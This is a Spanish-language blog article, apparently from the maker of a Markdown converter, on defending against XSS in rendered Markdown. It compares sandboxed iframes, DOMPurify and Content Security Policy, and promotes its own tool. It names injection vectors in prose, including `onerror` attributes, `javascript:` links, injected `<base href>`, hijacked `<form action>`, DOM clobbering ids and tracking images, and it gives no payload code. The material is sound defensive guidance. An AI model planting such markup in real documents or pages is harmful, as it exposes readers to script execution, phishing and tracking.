| Aislamiento en vez de filtrado, así que los huecos de la lista blanca importan menos | El maquetado pasa a ser cosa tuya: tamaño, scroll, impresión |
| `sandbox` sin `allow-same-origin` significa sin acceso a tu almacenamiento ni a tu DOM | `allow-scripts` junto con `allow-same-origin` anula todo el mecanismo |
| Se combina con una CSP en vez de competir con ella | Enlaces, foco y accesibilidad necesitan cableado deliberado |

**Precio:** gratis, parte de HTML.

**¿Para quién es?** Para cualquiera que muestre documentos cuyo marcado tiene que llegar intacto. Úsalo *junto con* un sanitizador, no en su lugar — un sandbox impide que un script llegue a tu página, y no hace nada contra un documento que hace phishing al lector dentro del marco.

### TransformPipe — un conversor que ya ha tomado estas decisiones

TransformPipe convierte Markdown en un documento HTML completo y autocontenido, dentro de tu navegador. La parte relevante aquí es que sanitizar no es una opción que se pueda olvidar activar: el HTML crudo de la fuente pasa por una lista blanca tanto en el camino hacia la página como en el camino hacia el archivo exportado.

| A favor | En contra |
| --- | --- |
| Una sola lista blanca, aplicada por DOMPurify en el navegador y por `xss` en el servidor | La lista blanca es fija: no hay política propia que configurar |
| Los ids de encabezado llevan prefijo, así que las anclas generadas no pueden solapar variables globales | Un documento a la vez, no un pipeline de compilación |
| Sin sesión iniciada, nada se sube — el archivo se lee y convierte en local | El trabajo lo hace el navegador, así que un archivo muy grande depende de la máquina |
| El archivo exportado es un único documento sin ninguna petición de red | No es una biblioteca: convierte, no se integra en tu aplicación |

**Precio:** gratis. Una cuenta añade historial, compartir y una API, también gratis.

**Detalles técnicos y funciones**

- Sanitiza el HTML renderizado, no la fuente Markdown
- La misma lista blanca en los dos lados de la frontera de red, así que no pueden desajustarse
- Ids de encabezado con el prefijo `doc-`, la defensa contra el DOM clobbering aplicada a mano
- La misma conversión desde una API REST, una CLI, una GitHub Action y un servidor MCP

**¿Para quién es?** Para cualquiera con un archivo `.md` que vino de otro sitio y una persona a la que enviárselo. La salida de un modelo es el caso habitual: [convertirla en una página que alguien pueda leer](/blog/ai-output-to-a-shareable-page) significa renderizar una cadena que no escribiste tú, que es exactamente el problema que describe este artículo.

## Dónde falla la opción obvia

DOMPurify es la respuesta por defecto correcta, y la sección honesta trata sobre sus límites, porque «usamos DOMPurify» es donde se detienen muchas revisiones de seguridad.

**Necesita un DOM, y uno falso falla en modo abierto.** En un servidor, o cargas jsdom o usas otra biblioteca. Dado un entorno en el que no puede funcionar, DOMPurify devuelve la entrada sin cambios en vez de lanzar un error, que es el peor modo de fallo posible: una configuración rota y una que funciona producen la misma salida para cualquier documento que no contenga HTML. El coste de no probar esto es un servicio que nunca ha sanitizado nada y no tiene forma de saberlo.

**Los valores por defecto son amplios, y el que es peligroso está apagado.** La lista blanca de fábrica de DOMPurify está pensada para ser útil en general, no mínima para tu producto, y `SANITIZE_NAMED_PROPS` — la opción que de verdad detiene el DOM clobbering — está apagada salvo que la enciendas. Nada de esto es una crítica a la biblioteca; ambas cosas son una crítica a instalarla y seguir adelante sin más.

**Un sanitizador no puede conocer tus variables globales.** `id="config"`, `id="state"`, `id="init"` — cualquier nombre que toque tu propio código en `window` — son invisibles para él, porque ningún sanitizador lee tu bundle. Prefijar todos los ids que sobreviven es la única defensa que escala, porque deja de depender de una lista de nombres que alguien tendría que mantener.

**Limpio no es lo mismo que inofensivo.** Una lista blanca que permite `<a href="https://...">` e `<img src="https://...">` permite una página que se parece exactamente a tu pantalla de inicio de sesión, y una imagen cuya carga avisa a un tercero de cuándo se abrió un documento. Ninguna de las dos ejecuta un script y ninguna es un fallo de XSS. Si tu modelo de amenazas incluye phishing o confirmaciones de lectura, el sanitizador no es el control que necesitas — `img-src` en una CSP está más cerca, y una pantalla intermedia en los enlaces salientes, todavía más cerca.

**Todo lo que viene después hereda el riesgo y ninguna de las garantías.** El resaltador, el inyector de anclas, la plantilla que envuelve el contenido, la expresión regular de «solo añado `target=_blank`»: cada uno es un sitio donde el HTML sanitizado se convierte en HTML sin sanitizar sin ningún cambio visible en el código que llama al sanitizador. Es la forma más habitual en que un sanitizador correcto termina en un informe de incidente.

**El servidor no puede poner una cabecera en un archivo.** Una CSP es una propiedad de una respuesta, y un archivo `.html` descargado no es una respuesta. Abierto desde disco no tiene cabeceras, así que la única política que puede llevar es una etiqueta `<meta http-equiv>` — que funciona para `script-src` e `img-src` y se ignora para `frame-ancestors` y `sandbox`. De ahí el argumento a favor de exportar sin ningún script dentro: un documento sin nada ejecutable es seguro incluso en `file://`, donde ninguna cabecera puede llegar.

## Sanitizar un documento que vas a entregar a otra persona

La mayoría de lo que se escribe sobre XSS en Markdown asume una aplicación web: tu página, tu origen, tu sesión. Convertir un archivo es una situación distinta, con un conjunto distinto de responsabilidades.

Cuando renderizas Markdown de origen dudoso en tu aplicación, proteges a tus usuarios de un documento. Cuando conviertes un archivo Markdown y le mandas el HTML a un colega, proteges *a esa persona* de un documento — uno que llega con tu nombre puesto, desde una dirección en la que confía, después de pasar el filtrado que haga su organización a los adjuntos de desconocidos. Un `<script>` que sobrevive a tu conversión ha quedado blanqueado.

De ahí se siguen tres cosas. Sanitiza en la conversión aunque el archivo sea «solo un documento», porque el navegador del destinatario ejecutará lo que le envíes con la misma disposición que el tuyo. Prefiere exportar sin ningún script en vez de con scripts que consideras seguros, porque ni el destinatario ni su pasarela de correo pueden auditar la diferencia. Y mantén el archivo autocontenido, lo que es tanto una propiedad de seguridad como una comodidad: un documento que no pide nada a la red no puede informar de cuándo se leyó, y no puede cambiar después de que lo enviaste.

Después prueba tu propio pipeline con tres entradas: un atributo `onerror`, un enlace `javascript:` y un `id` que coincida con una variable global que lea tu código. Si cualquiera de las dos primeras llega a la página, tienes un sanitizador que añadir y probablemente una cabecera que fijar. La tercera va a llegar, que es justo lo que hay que comprobar — verifica que llega con un prefijo y no con el nombre que lee tu código. Si estás eligiendo un conversor en vez de construir uno, [qué hace cada herramienta en la fase de sanitizado](/blog/best-markdown-to-html-converters) es la columna que importa, y varias herramientas muy usadas dejan pasar el HTML crudo por diseño.

## Cómo elegir

1. **Pregúntate si el HTML crudo es una función que de verdad ofreces.** Si no lo es, escápalo y ya está: `html: false` en `markdown-it` no cuesta nada mantener y no se puede saltar, y la alternativa es una lista blanca que seguirás manteniendo en tres años.
2. **Elige el sanitizador que corre donde se renderiza el HTML, y luego prueba que falla como debe.** En un navegador, DOMPurify usa el parser que va a renderizar el resultado, cerrando el hueco de mutation XSS; en un servidor, todas las opciones traen su propio parser, así que elige uno que apunte a la fidelidad de un navegador — y comprueba en tu batería de pruebas que se elimina una etiqueta `<script>` en la configuración de producción, porque un DOM mal configurado falla en modo abierto y en silencio.
3. **Escribe una única lista blanca e impórtala en todas partes.** Dos sanitizadores configurados por separado terminarán desajustándose, y el día que ocurra, el documento que se renderiza sin problemas en tu aplicación se queda guardado con un `<iframe>` dentro para el siguiente que lo use.
4. **Coloca el sanitizador después del renderizador y después de cada transformación, y prefija todo id que sobreviva.** Cualquier cosa que edite la cadena de HTML río abajo queda fuera de la garantía del sanitizador, y el DOM clobbering no necesita ningún script, así que un prefijo sobre los ids que sobreviven — incluidos los que generan tus anclas de encabezado — es un cambio de una línea que acaba con toda una clase de fallo.
5. **Añade la cabecera que necesitarías si el sanitizador se equivocara.** `script-src 'none'`, `base-uri 'none'` y `frame-ancestors 'none'` en una ruta que muestra documentos convierten una inyección lograda en una petición bloqueada; si no puedes usarlas porque la página ejecuta tu propia aplicación, esa es la razón para mover el renderizado de documentos a su propia ruta.

## Conclusión

Markdown permite HTML crudo porque se diseñó así, y ningún cuidado en un parser cambia eso; la seguridad de un documento Markdown renderizado es una propiedad de lo que haces después de renderizarlo. Eso significa una lista blanca escrita y aplicada al HTML renderizado, la misma lista blanca en el navegador y en el servidor, todo id que sobreviva con prefijo, nada que edite la cadena después, y una Content Security Policy detrás de todo eso para el fallo que aún no has encontrado. Si prefieres no cargar con ese código para un archivo que solo necesitas convertir y enviar, [un conversor que sanitiza por defecto convierte tu Markdown a HTML](/) aplicando esos pasos en tu propio navegador — una lista blanca, ids de encabezado con prefijo, un archivo exportado sin scripts ni peticiones de red, gratis, sin que se suba nada mientras estés sin sesión iniciada.

## Preguntas frecuentes

### ¿Es vulnerable Markdown a XSS?

Markdown en sí mismo es un formato de texto, pero casi todo renderizador de Markdown deja pasar el HTML crudo hasta la salida, así que un archivo `.md` puede llevar `<script>`, `onerror=` y URLs `javascript:` directas al navegador. La vulnerabilidad está en el pipeline de renderizado, no en el formato. Cualquier pipeline que renderice Markdown que no hayas escrito necesita un sanitizador entre el renderizador y la página.

### ¿DOMPurify hace seguro el Markdown por sí solo?

Elimina el marcado ejecutable, que es casi todo el trabajo, y deja tres huecos. Su protección contra DOM clobbering solo está completa con `SANITIZE_NAMED_PROPS` activado, no puede saber qué variables globales lee tu propio código, y cualquier cosa que edite la cadena de HTML después de que se ejecute queda fuera de su garantía. Combínalo con una Content Security Policy y trata su salida como definitiva.

### ¿Debo sanitizar el Markdown o el HTML?

El HTML, siempre, y solo después de que se haya ejecutado cada transformación. Markdown tiene varias formas de escribir la misma salida, y el renderizador inventa marcado que nunca apareció en la fuente — un autolink se convierte en un anchor completo, un encabezado se convierte en un id — así que un filtro sobre la fuente está comprobando una cadena que no es la que se sirve al final.

### ¿Basta con escapar el HTML en vez de sanitizarlo?

Si tus usuarios no necesitan escribir HTML, escapar es mejor que sanitizar: produce texto, así que no hay nada que saltarse y ninguna lista blanca que mantener. `markdown-it` hace esto por defecto con `html: false`. En el momento en que alguien necesite un bloque `<details>` o una tabla incrustada, vuelves a necesitar una lista blanca.

### ¿Qué protege una Content Security Policy que un sanitizador no protege?

El fallo en tu propio sanitizador. Un sanitizador elimina el marcado que reconoce como peligroso; una CSP le dice al navegador que no ejecute scripts en absoluto, lo que sigue funcionando aunque algo se haya escapado. También cierra vectores que una lista blanca no puede expresar, como un `<base href>` inyectado — para eso hace falta `base-uri 'none'`.

### ¿Puede el HTML crudo en Markdown hacer daño sin ningún JavaScript?

Sí, y esta es la parte que se le pasa a la gente. Un atributo `id` solapa una variable global, un `<base href>` redirige cada enlace relativo de la página, un `<form action>` envía la entrada del lector a otro sitio, `position: fixed` en un atributo `style` cubre tu interfaz con la de otra persona, y una `<img src>` remota informa de cuándo se leyó tu documento. Nada de eso necesita una etiqueta script.

### Me llegó un archivo `.md` de alguien que no conozco — ¿es seguro abrir el HTML convertido?

Solo con un conversor que sanitiza, y conviene saber cuál. Varios conversores muy usados dejan pasar el HTML crudo por diseño y lo dicen en su documentación, así que el `<script>` del archivo se convierte en un `<script>` en el HTML que abres. Comprueba el comportamiento de la herramienta antes de hacer doble clic en la salida, y recuerda que si reenvías ese HTML, ahora llega desde ti.
